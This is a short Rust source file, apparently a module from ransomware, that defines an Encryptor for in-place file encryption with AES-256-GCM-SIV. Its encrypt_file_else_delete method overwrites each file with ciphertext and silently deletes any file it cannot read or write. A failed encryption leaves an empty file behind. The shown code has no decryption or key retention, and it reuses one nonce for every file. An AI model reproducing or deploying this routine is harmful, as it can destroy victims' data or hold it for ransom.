use aes_gcm_siv::aead::consts::{B0, B1};
use aes_gcm_siv::aead::generic_array::typenum::{UInt, UTerm};
use aes_gcm_siv::aead::generic_array::GenericArray;
use aes_gcm_siv::aead::{Aead, NewAead};
use aes_gcm_siv::{Aes256GcmSiv, Key, Nonce};
use rand::prelude::*;
use rand_hc::Hc128Rng;
use std::fs;
use std::path;

pub struct Encryptor {
    nonce: GenericArray<u8, UInt<UInt<UInt<UInt<UTerm, B1>, B1>, B0>, B0>>,
    cipher: Aes256GcmSiv,
}

impl Encryptor {
    pub fn from(key_bytes: [u8; 32], nonce_bytes: [u8; 12]) -> Encryptor {
        let key = Key::from(key_bytes);
        let cipher = Aes256GcmSiv::new(&key);
        let nonce = Nonce::from(nonce_bytes);

        Encryptor { nonce, cipher }
    }

    pub fn encrypt(&self, plain_text: &Vec<u8>) -> Vec<u8> {
        match self.cipher.encrypt(&self.nonce, plain_text.as_ref()) {
            Ok(encrypted_text) => encrypted_text,
            Err(_) => vec![],
        }
    }

    pub fn encrypt_file_else_delete(&self, path: &path::PathBuf) {
        let bytes_to_encrypt = match fs::read(&path) {
            Ok(bytes) => bytes,
            Err(_) => {
                attempt_delete_file(&path);
                return;
            }
        };
        let bytes_encrypted = self.encrypt(&bytes_to_encrypt);

        match fs::write(&path, bytes_encrypted) {
            Ok(_) => (),
            Err(_) => {
                attempt_delete_file(&path);
            }
        };
    }
}

fn attempt_delete_file(path: &path::PathBuf) {
    match fs::remove_file(path) {
        Ok(_) => (),
        Err(_) => (),
    };
}
